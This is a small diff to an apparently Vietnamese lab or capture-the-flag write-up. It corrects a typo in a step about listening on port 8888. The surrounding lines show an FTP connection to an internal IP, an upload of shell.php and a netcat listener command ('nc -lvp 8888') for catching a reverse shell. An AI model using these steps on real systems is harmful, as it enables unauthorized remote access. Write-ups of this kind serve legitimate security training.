@@ -95,7 +95,7 @@ ftp 172.20.22.208
 ```
 put shell.php
 ```
-- Quoay trở lại shell tôi cấu hình lắng nghe trên cổng 8888
+- Quay trở lại shell tôi cấu hình lắng nghe trên cổng 8888
 ```
 nc -lvp 8888
 ```
